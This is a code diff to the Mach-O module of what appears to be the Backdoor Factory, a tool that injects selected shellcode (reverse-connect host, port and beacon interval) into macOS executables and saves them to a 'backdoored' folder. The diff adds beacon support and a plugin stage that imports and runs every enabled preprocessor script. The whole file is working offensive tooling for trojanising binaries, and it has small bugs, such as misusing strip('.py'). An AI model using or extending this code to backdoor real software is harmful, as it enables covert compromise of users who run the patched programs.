@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 '''
 
-Copyright (c) 2013-2014, Joshua Pitts
+Copyright (c) 2013-2016, Joshua Pitts
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without modification,
@@ -35,6 +35,8 @@ POSSIBILITY OF SUCH DAMAGE.
 import os
 import struct
 import shutil
+import tempfile
+import sys
 from intel.MachoIntel64 import macho_intel64_shellcode
 from intel.MachoIntel32 import macho_intel32_shellcode
 
@@ -42,7 +44,8 @@ from intel.MachoIntel32 import macho_intel32_shellcode
 class machobin():
 
     def __init__(self, FILE, OUTPUT=None, SHELL=None, HOST="127.0.0.1", PORT=8080,
-                 SUPPORT_CHECK=False, SUPPLIED_SHELLCODE=None, FAT_PRIORITY="x64"
+                 SUPPORT_CHECK=False, SUPPLIED_SHELLCODE=None, FAT_PRIORITY="x64",
+                 BEACON=15, PREPROCESS=False
                  ):
         self.FILE = FILE
         self.OUTPUT = OUTPUT
@@ -58,6 +61,11 @@ class machobin():
         self.SUPPORT_CHECK = SUPPORT_CHECK
         self.FAT_FILE = False
         self.FAT_PRIORITY = FAT_PRIORITY
+        self.BEACON = BEACON
+        self.PREPROCESS = PREPROCESS
+        self.ORIGINAL_FILE = self.FILE
+        self.tmp_file = None
+        self.keep_temp = False
         self.supported_CPU_TYPES = [0x7,  # i386
                                     0x01000007  # x64
                                     ]
@@ -81,21 +89,105 @@ class machobin():
             else:
                 print "%s is supported." % self.FILE
                 return True
+
         self.support_check()
         result = self.patch_macho()
         return result
 
     def support_check(self):
         print "[*] Checking file support"
-        check = self.get_structure()
-        if check is False:
-            self.supported = False
-
-        for key, value in self.load_cmds.iteritems():
-            self.ImpValues[key] = self.find_Needed_Items(value)
-            if self.ImpValues[key]['text_segment'] == {}:
-                print '[!] Not a proper Mach-O file'
+        with open(self.FILE, 'r+b') as self.bin:
+            check = self.get_structure()
+            if check is False:
                 self.supported = False
+
+            for key, value in self.load_cmds.iteritems():
+                self.ImpValues[key] = self.find_Needed_Items(value)
+                if self.ImpValues[key]['text_segment'] == {}:
+                    print '[!] Not a proper Mach-O file'
+                    self.supported = False
+
+    
+    def loadthis(self, amod):
+        section = amod.split('.')
+        mod = ".".join(section[:-1])
+        amod = __import__(mod)
+        for item in section[1:]:
+            amod = getattr(amod, item)
+        return amod
+
+    def preprocess(self):
+        # files in directory
+        ignore = ['__init__.py']
+        abspath = os.path.abspath(__file__)
+        dname = os.path.dirname(abspath)
+        sys.path.append(dname)
+        for afile in os.listdir(dname + "/preprocessor"):
+            if afile in ignore:
+                continue
+            if ".pyc" in afile:
+                continue
+            
+            if len(afile.split(".")) > 2:
+                print "!" * 50
+                print "\t[!] Make sure there are no '.' in your preprocessor filename:", afile
+                print "!" * 50
+                
+                return False
+            
+            name = "preprocessor." +  afile.strip(".py")
+            
+            preprocessor_name = __import__( name, fromlist=[''])
+            
+            if preprocessor_name.enabled is True:
+                print "[*] Executing preprocessor:", afile.strip(".py")
+            else:
+                continue
+
+            if preprocessor_name.file_format.lower() in ['macho', 'all']: #'elf', 'macho', 'mach-o']:
+                print '[*] Running preprocessor', afile.strip(".py"), "against", preprocessor_name.file_format, "formats"
+            else:
+                continue
+            
+            # Allow if any processors to keep it 
+            if self.keep_temp is False:
+                self.keep_temp = preprocessor_name.keep_temp
+            
+            # create tempfile here always
+            
+            if self.tmp_file == None:
+                self.tmp_file = tempfile.NamedTemporaryFile()
+                self.tmp_file.write(open(self.FILE, 'rb').read())
+                self.tmp_file.seek(0)
+                print "[*] Creating temp file:", self.tmp_file.name
+            else:
+                print "[*] Using existing tempfile from prior preprocessor"
+            
+            load_name = name +  ".preprocessor"
+            preproc = self.loadthis(load_name)
+            
+            m = preproc(self)
+            
+            print "=" * 50
+            
+            # execute preprocessor
+            result = m.run()
+            
+            if result is False:
+                print "[!] Preprocessor Failure :("
+
+            print "=" * 50
+            
+            # After running push it to BDF.
+            
+            self.FILE = self.tmp_file.name[:]
+    
+            # check for support after each modification
+            if preprocessor_name.recheck_support is True:
+                issupported = self.support_check()
+                if issupported is False:
+                    print self.FILE, "is not supported."
+                    return False                
 
     def output_options(self):
         """
@@ -108,6 +200,9 @@ class machobin():
         "This function sets the shellcode."
 
         print "[*] Looking for and setting selected shellcode"
+
+        avail_shells = []
+
         self.bintype = False
         if MagicNumber == '0xfeedface':
             #x86
@@ -146,10 +241,12 @@ class machobin():
                     continue
                 else:
                     print "   {0}".format(item)
+                    avail_shells.append(item)
+            self.avail_shells = avail_shells
             return False
         #else:
         #    shell_cmd = self.SHELL + "()"
-        self.shells = self.bintype(self.HOST, self.PORT, self.jumpLocation, self.SUPPLIED_SHELLCODE)
+        self.shells = self.bintype(self.HOST, self.PORT, self.jumpLocation, self.SUPPLIED_SHELLCODE, self.BEACON)
         self.allshells = getattr(self.shells, self.SHELL)()
         self.shellcode = self.shells.returnshellcode()
         return self.shellcode
@@ -405,6 +502,9 @@ class machobin():
 
         self.output_options()
 
+        if self.PREPROCESS is True:
+            self.preprocess()
+
         if not os.path.exists("backdoored"):
             os.makedirs("backdoored")
 
@@ -562,4 +662,18 @@ class machobin():
                     bin.write(struct.pack("<I", oldsize - 0x10))
 
         print "[!] Patching Complete"
+
+        # CHECK AND DELETE TMP FILE HERE
+        
+        if self.tmp_file != None:
+            if self.keep_temp is True:
+                # tmpfilename_orginalname.exe
+                print "[*] Saving TempFile to:", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE 
+                shutil.copy2(self.FILE, os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE )
+            try:
+                shutil.rmtree(self.tmp_file.name)
+            except: # OSError:
+                pass
+                #print "[*] TempFile already removed."
+
         return True
